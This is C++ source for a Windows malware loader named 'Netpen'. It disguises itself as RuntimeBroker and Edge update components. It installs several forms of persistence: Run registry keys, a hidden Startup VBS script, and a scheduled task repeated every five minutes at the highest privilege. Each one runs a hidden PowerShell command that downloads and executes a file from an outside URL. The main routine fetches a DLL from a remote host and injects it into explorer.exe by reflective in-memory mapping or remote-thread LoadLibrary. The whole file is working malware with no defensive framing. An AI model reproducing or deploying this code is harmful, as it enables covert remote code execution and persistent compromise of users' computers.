#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include "config.h"

#define NETPEN_REGKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
#define NETPEN_DOWNLOAD_URL L"https://allseeing.netlify.app/a"
#define NETPEN_FILENAME L"RuntimeBroker.exe"

static std::wstring g_supabaseHost;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static std::vector<BYTE> HttpDownloadToMemory(const wchar_t* path) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return {};
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return {}; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    std::vector<BYTE> result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        size_t old = result.size();
        result.resize(old + size);
        DWORD downloaded = 0;
        if (!WinHttpReadData(hRequest, result.data() + old, size, &downloaded) || downloaded == 0) break;
        result.resize(old + downloaded);
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return result;
}

static bool HttpGetToString(const wchar_t* path, std::string& out) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    std::string result;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    out = result;
    return !result.empty();
}

static int GetRemoteVersion() {
    std::string verStr;
    if (HttpGetToString(L"/storage/v1/object/public/Netpen/version.txt", verStr))
        return atoi(verStr.c_str());
    return -1;
}

static int GetStoredVersion() {
    HKEY hKey;
    DWORD ver = 0, sz = sizeof(ver), type = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "V", NULL, &type, (BYTE*)&ver, &sz);
        RegCloseKey(hKey);
    }
    return (int)ver;
}

static void SetStoredVersion(int ver) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD v = (DWORD)ver;
        RegSetValueExA(hKey, "V", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static DWORD FindExplorerPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    DWORD sessionId = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) sessionId = 0;
    if (sessionId == 0) {
        typedef DWORD (WINAPI *WTSGACS_t)();
        WTSGACS_t wts = (WTSGACS_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "WTSGetActiveConsoleSessionId");
        if (wts) sessionId = wts();
    }
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"explorer.exe") == 0) {
                DWORD procSess = 0;
                if (ProcessIdToSessionId(pe.th32ProcessID, &procSess) && procSess == sessionId) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

static bool RunCmd(const std::wstring& cmd) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring mutableCmd = cmd;
    if (!CreateProcessW(NULL, &mutableCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return false;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static void InstallPersistence() {
    HKEY hKey;
    bool installed = (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS);
    if (installed) RegCloseKey(hKey);

    std::wstring psCmd = L"powershell -w h -c \"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"";

    if (!installed) {
        if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD one = 1;
            RegSetValueExA(hKey, "I", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
            RegCloseKey(hKey);
        }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
            RegCloseKey(hKey);
        }
        wchar_t appData[MAX_PATH];
        if (GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH) > 0) {
            std::wstring vbsPath = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + std::wstring(NETPEN_FILENAME) + L".update.vbs";
            std::wstring vbsContent = L"CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"\"\", 0, False\r\n";
            HANDLE hFile = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD w = 0;
                WriteFile(hFile, vbsContent.c_str(), (DWORD)(vbsContent.size() * sizeof(wchar_t)), &w, NULL);
                CloseHandle(hFile);
            }
        }
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
            RegCloseKey(hKey);
        }
    }

    std::wstring batDir = L"C:\\ProgramData\\Netpen";
    CreateDirectoryW(batDir.c_str(), NULL);
    std::wstring batFile = batDir + L"\\" + std::wstring(NETPEN_FILENAME) + L".update.bat";
    std::wstring batContent = L"@start /b \"\" " + psCmd + L"\r\n";
    HANDLE hBat = CreateFileW(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(hBat, batContent.c_str(), (DWORD)(batContent.size() * sizeof(wchar_t)), &w, NULL);
        CloseHandle(hBat);
    }
    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + batFile + L"\\\"\" /sc MINUTE /mo 5 /rl HIGHEST /f";
    RunCmd(taskCmd);
}

// ─── Reflective PE Mapper ─────────────────────────────────────────────

static BYTE* RvaToPtr(BYTE* dllData, PIMAGE_NT_HEADERS nt, DWORD rva) {
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sections[i].VirtualAddress;
        DWORD sz = (sections[i].Misc.VirtualSize > sections[i].SizeOfRawData) ? sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
        if (rva >= va && rva < va + sz)
            return dllData + (rva - va) + sections[i].PointerToRawData;
    }
    if (rva < (DWORD)(sections[0].VirtualAddress))
        return dllData + rva;
    return NULL;
}

static ULONGLONG GetRemoteModuleBase(HANDLE hProcess, const wchar_t* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetProcessId(hProcess));
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    MODULEENTRY32W me = { sizeof(me) };
    ULONGLONG base = 0;
    if (Module32FirstW(hSnapshot, &me)) {
        do {
            if (lstrcmpiW(me.szModule, name) == 0) { base = (ULONGLONG)me.modBaseAddr; break; }
            if (lstrcmpiW(me.szExePath, name) == 0) { base = (ULONGLONG)me.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me));
    }
    CloseHandle(hSnapshot);
    return base;
}

static ULONGLONG ForceLoadDll(HANDLE hProcess, const wchar_t* dllName) {
    size_t nameBytes = (wcslen(dllName) + 1) * sizeof(wchar_t);
    void* remoteName = VirtualAllocEx(hProcess, NULL, nameBytes, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteName) return 0;
    WriteProcessMemory(hProcess, remoteName, dllName, nameBytes, NULL);

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC llW = GetProcAddress(hK32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llW, remoteName, 0, NULL);
    if (!hThread) { VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE); return 0; }
    WaitForSingleObject(hThread, 10000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    return (ULONGLONG)exitCode;
}

static ULONGLONG MapSections(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt) {
    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    ULONGLONG preferedBase = nt->OptionalHeader.ImageBase;

    void* alloc = VirtualAllocEx(hProcess, (void*)preferedBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) alloc = VirtualAllocEx(hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) return 0;
    ULONGLONG remoteBase = (ULONGLONG)alloc;

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, alloc, dllData, nt->OptionalHeader.SizeOfHeaders, &bytesWritten) || bytesWritten != nt->OptionalHeader.SizeOfHeaders) {
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        return 0;
    }

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        void* remoteAddr = (BYTE*)remoteBase + sections[i].VirtualAddress;
        BYTE* localData = dllData + sections[i].PointerToRawData;
        DWORD size = (sections[i].SizeOfRawData < sections[i].Misc.VirtualSize) ? sections[i].SizeOfRawData : sections[i].Misc.VirtualSize;
        if (size > 0) {
            bytesWritten = 0;
            if (!WriteProcessMemory(hProcess, remoteAddr, localData, size, &bytesWritten) || bytesWritten != size) {
                VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
                return 0;
            }
        }

        DWORD protect = PAGE_READONLY;
        DWORD ch = sections[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
        if (ch & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
        if ((ch & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE)) == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE))
            protect = PAGE_EXECUTE_READWRITE;
        DWORD old;
        VirtualProtectEx(hProcess, remoteAddr, size, protect, &old);
    }
    return remoteBase;
}

static bool ResolveImports(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt, ULONGLONG remoteBase) {
    PIMAGE_DATA_DIRECTORY importDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir->VirtualAddress || !importDir->Size) return true;

    PIMAGE_IMPORT_DESCRIPTOR desc = (PIMAGE_IMPORT_DESCRIPTOR)RvaToPtr(dllData, nt, importDir->VirtualAddress);
    if (!desc) return true;

    for (; desc->Name; desc++) {
        char* dllNameA = (char*)RvaToPtr(dllData, nt, desc->Name);
        if (!dllNameA) return false;

        int wlen = MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, NULL, 0);
        wchar_t* dllNameW = new wchar_t[wlen];
        MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllNameW, wlen);

        ULONGLONG remoteDllBase = GetRemoteModuleBase(hProcess, dllNameW);
        if (!remoteDllBase) remoteDllBase = ForceLoadDll(hProcess, dllNameW);
        if (!remoteDllBase) { delete[] dllNameW; return false; }

        HMODULE hLocalDll = LoadLibraryW(dllNameW);
        if (!hLocalDll) { delete[] dllNameW; return false; }

        PIMAGE_THUNK_DATA origThunk = desc->OriginalFirstThunk
            ? (PIMAGE_THUNK_DATA)RvaToPtr(dllData, nt, desc->OriginalFirstThunk)
            : (PIMAGE_THUNK_DATA)RvaToPtr(dllData, nt, desc->FirstThunk);
        if (!origThunk) { FreeLibrary(hLocalDll); delete[] dllNameW; return false; }

        int i = 0;
        for (; origThunk[i].u1.AddressOfData; i++) {
            FARPROC funcAddr = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk[i].u1.Ordinal)) {
                funcAddr = GetProcAddress(hLocalDll, MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk[i].u1.Ordinal)));
            } else {
                PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)RvaToPtr(dllData, nt, (DWORD)origThunk[i].u1.AddressOfData);
                if (!ibn) { FreeLibrary(hLocalDll); delete[] dllNameW; return false; }
                funcAddr = GetProcAddress(hLocalDll, (char*)ibn->Name);
            }
            if (!funcAddr) { FreeLibrary(hLocalDll); delete[] dllNameW; return false; }

            ULONGLONG remoteEntry = remoteBase + desc->FirstThunk + (ULONGLONG)i * sizeof(ULONGLONG);
            ULONGLONG addr = (ULONGLONG)funcAddr;
            SIZE_T written = 0;
            WriteProcessMemory(hProcess, (void*)remoteEntry, &addr, sizeof(addr), &written);
            if (written != sizeof(addr)) { FreeLibrary(hLocalDll); delete[] dllNameW; return false; }
        }

        FreeLibrary(hLocalDll);
        delete[] dllNameW;
    }
    return true;
}

static bool ApplyRelocs(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt, ULONGLONG remoteBase) {
    ULONGLONG delta = remoteBase - nt->OptionalHeader.ImageBase;
    if (delta == 0) return true;

    PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress) return false;

    BYTE* cursor = RvaToPtr(dllData, nt, relocDir->VirtualAddress);
    BYTE* end = cursor + relocDir->Size;
    if (!cursor) return false;

    while (cursor < end) {
        PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)cursor;
        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
        DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(block + 1);
        for (DWORD i = 0; i < count; i++) {
            if (entries[i] == 0) continue;
            int type = (entries[i] >> 12) & 0xF;
            int offset = entries[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG remoteAddr = remoteBase + block->VirtualAddress + offset;
                ULONGLONG oldValue = 0;
                SIZE_T read = 0;
                ReadProcessMemory(hProcess, (void*)remoteAddr, &oldValue, sizeof(oldValue), &read);
                if (read != sizeof(oldValue)) continue;
                oldValue += delta;
                WriteProcessMemory(hProcess, (void*)remoteAddr, &oldValue, sizeof(oldValue), NULL);
            }
        }
        cursor += block->SizeOfBlock;
    }
    return true;
}

static DWORD GetExportRva(BYTE* dllData, PIMAGE_NT_HEADERS nt, const char* name) {
    PIMAGE_DATA_DIRECTORY expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)RvaToPtr(dllData, nt, expDir->VirtualAddress);
    if (!exp) return 0;

    DWORD* names = (DWORD*)RvaToPtr(dllData, nt, exp->AddressOfNames);
    WORD* ordinals = (WORD*)RvaToPtr(dllData, nt, exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)RvaToPtr(dllData, nt, exp->AddressOfFunctions);
    if (!names || !ordinals || !functions) return 0;

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* funcName = (char*)RvaToPtr(dllData, nt, names[i]);
        if (funcName && strcmp(funcName, name) == 0)
            return functions[ordinals[i]];
    }
    return 0;
}

static bool ReflectiveInject(HANDLE hProcess, BYTE* dllData, size_t dllSize, ULONGLONG* outBase) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;

    ULONGLONG remoteBase = MapSections(hProcess, dllData, nt);
    if (!remoteBase) return false;
    *outBase = remoteBase;

    if (!ApplyRelocs(hProcess, dllData, nt, remoteBase)) {
        VirtualFreeEx(hProcess, (void*)remoteBase, 0, MEM_RELEASE);
        return false;
    }
    if (!ResolveImports(hProcess, dllData, nt, remoteBase)) {
        VirtualFreeEx(hProcess, (void*)remoteBase, 0, MEM_RELEASE);
        return false;
    }
    return true;
}

static bool DiskInject(HANDLE hProcess, BYTE* dllData, size_t dllSize, ULONGLONG* outBase) {
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    std::string dllPath = std::string(tmpDir) + "agent_" + std::to_string(GetTickCount()) + ".dll";

    HANDLE hFile = CreateFileA(dllPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hFile, dllData, (DWORD)dllSize, &written, NULL);
    CloseHandle(hFile);
    if (written != dllSize) { DeleteFileA(dllPath.c_str()); return false; }

    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, NULL, 0);
    std::wstring dllPathW((size_t)wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, &dllPathW[0], wlen);

    size_t nameBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
    void* remotePath = VirtualAllocEx(hProcess, NULL, nameBytes, MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) { DeleteFileA(dllPath.c_str()); return false; }
    WriteProcessMemory(hProcess, remotePath, dllPathW.c_str(), nameBytes, NULL);

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC llW = GetProcAddress(hK32, "LoadLibraryW");

    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llW, remotePath, 0, NULL);
    if (!hLoadThread) { VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE); DeleteFileA(dllPath.c_str()); return false; }
    DWORD waitResult = WaitForSingleObject(hLoadThread, 10000);
    DWORD loadExitCode = 0;
    GetExitCodeThread(hLoadThread, &loadExitCode);
    if (waitResult == WAIT_TIMEOUT) TerminateThread(hLoadThread, 1);
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);

    if (waitResult != WAIT_OBJECT_0 || loadExitCode == 0) { DeleteFileA(dllPath.c_str()); return false; }

    *outBase = GetRemoteModuleBase(hProcess, dllPathW.c_str());
    DeleteFileA(dllPath.c_str());
    return *outBase != 0;
}

static bool StartAgentInit(HANDLE hProcess, ULONGLONG dllBase, DWORD initRva) {
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(dllBase + initRva), (void*)dllBase, 0, NULL);
    if (!hThread) return false;
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    InitConfig();
    InstallPersistence();

    HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
    bool agentAlive = (hAgentEvent != NULL && WaitForSingleObject(hAgentEvent, 0) == WAIT_OBJECT_0);
    if (hAgentEvent) CloseHandle(hAgentEvent);
    if (!agentAlive) {
        HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
        if (hOld) { agentAlive = true; CloseHandle(hOld); }
    }

    int remoteVer = GetRemoteVersion();
    int storedVer = GetStoredVersion();

    if (agentAlive && remoteVer >= 0 && remoteVer <= storedVer)
        return 0;

    if (agentAlive && remoteVer > storedVer) {
        HANDLE hStop = CreateEventW(NULL, TRUE, FALSE, L"NetpenAgentStop");
        if (hStop) SetEvent(hStop);
        HWND hWnd = FindWindowW(L"RuntimeBrokerHiddenWindow", L"");
        if (hWnd) PostMessageW(hWnd, WM_CLOSE, 0, 0);
        for (int i = 0; i < 30; i++) {
            HANDLE hRun = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
            if (!hRun) {
                HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
                if (!hOld) break;
                CloseHandle(hOld);
                break;
            }
            bool alive = (WaitForSingleObject(hRun, 0) == WAIT_OBJECT_0);
            CloseHandle(hRun);
            if (!alive) break;
            Sleep(1000);
        }
        if (hStop) CloseHandle(hStop);
    }

    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"NetpenAgentInjection");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    DWORD pid = FindExplorerPid();
    if (!pid) { if (hMutex) CloseHandle(hMutex); return 1; }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) { if (hMutex) CloseHandle(hMutex); return 1; }

    // Download DLL into memory (no disk)
    std::vector<BYTE> dllBytes;
    for (int attempt = 0; attempt < 3; attempt++) {
        dllBytes = HttpDownloadToMemory(L"/storage/v1/object/public/Netpen/agent.dll");
        if (!dllBytes.empty()) break;
        if (attempt < 2) Sleep(2000);
        else { CloseHandle(hProcess); if (hMutex) CloseHandle(hMutex); return 1; }
    }

    // Try reflective injection first, fall back to disk-based LoadLibraryW
    ULONGLONG dllBase = 0;
    bool injected = ReflectiveInject(hProcess, dllBytes.data(), dllBytes.size(), &dllBase);
    if (!injected) injected = DiskInject(hProcess, dllBytes.data(), dllBytes.size(), &dllBase);

    if (!injected) { CloseHandle(hProcess); if (hMutex) CloseHandle(hMutex); return 1; }

    // Get AgentInit RVA from local DLL data
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    DWORD initRva = GetExportRva(dllBytes.data(), nt, "AgentInit");

    if (initRva) StartAgentInit(hProcess, dllBase, initRva);
    // If AgentInit not found, DllMain already ran (agent is loaded)

    CloseHandle(hProcess);
    if (hMutex) CloseHandle(hMutex);

    if (remoteVer > 0) SetStoredVersion(remoteVer);
    return 0;
}
